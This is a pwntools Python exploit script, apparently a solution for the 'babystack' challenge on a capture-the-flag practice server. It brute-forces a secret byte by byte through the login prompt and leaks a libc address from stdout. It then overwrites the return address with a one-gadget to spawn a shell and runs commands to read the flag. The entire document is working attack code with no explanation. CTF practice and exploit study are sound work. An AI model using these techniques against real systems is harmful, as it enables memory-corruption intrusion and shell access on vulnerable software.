from pwn import *

locdbg=False

host='chall.pwnable.tw'
port=10205
filename='./babystack'
libcname='./libc_64.so.6'
elf=ELF(filename)
slpt=0.1

if locdbg:
    p=process(filename)
    libc=ELF('./libc_64.so.6')
    #context.log_level='debug'
else:
    p=remote(host,port)
    libc=ELF(libcname)
    #context.log_level='debug'

def pwndbg(ctt):
    if locdbg:
        gdb.attach(p,gdbscript=ctt)

def slp():
    if not locdbg:
        sleep(slpt)

def fin():
    p.interactive()

def copy(ctt,pad):
    p.recvuntil(b'>> ')
    p.send(b'3'+pad)
    p.recvuntil(b'Copy :')
    p.send(ctt)
    p.recvuntil(b'copy !')

def log(ctt,pad):
    p.recvuntil(b'>> ')
    p.send(b'1'+pad)
    p.recvuntil(b'passowrd :')
    p.send(ctt)
    ans=p.recvuntil(b'!')
    return ans[0]==76

def logout(pad):
    p.recvuntil(b'>> ')
    p.send(b'1'+pad)

def ext():
    p.recvuntil(b'>> ')
    p.send(b'2')


buf=b''
pie=b'\x60\x10'
stack=b'\x31'

#pwndbg('')
def leak(prepad,st,ed,init,optpad):
    for i in range(st,ed):
        for j in range(1,256):
            ctt=prepad+init+p8(j)+b'\0'
            if(log(ctt,optpad)):
                init+=p8(j)
                logout(optpad)
                print('leak['+str(i)+']= '+hex(j))
                break
    return init

buf=leak(b'',0,0x10,b'',b'')
buf0=u64(buf[0:8])
buf1=u64(buf[8:16])
print('buf= '+hex(buf0)+' : '+hex(buf1))

log(buf+b'\0'+b'#'*0x2f+buf,b'')
copy(b'*'*0x20,b'')
logout(b'')

_IO_2_1_stdout_leak=leak(buf,1,6,b'1',b'')
_IO_addr=u64(_IO_2_1_stdout_leak.ljust(8,b'\0'))//0x100*0x100+0x20
libc_base=_IO_addr-libc.symbols['_IO_2_1_stdout_']
print("libc leak= "+str(_IO_2_1_stdout_leak))
print('libc_base= '+hex(libc_base))

onegadget=0xf0567+libc_base

log(buf+b'\0'+b'#'*0x2f+buf+b'#'*0x18+p64(onegadget),b'')
copy(b'*'*0x20,b'')
#pwndbg('')
ext()
#fin()
p.sendline('cd home')
p.sendline('cd babystack')
p.sendline('cat flag')
print(p.recv())
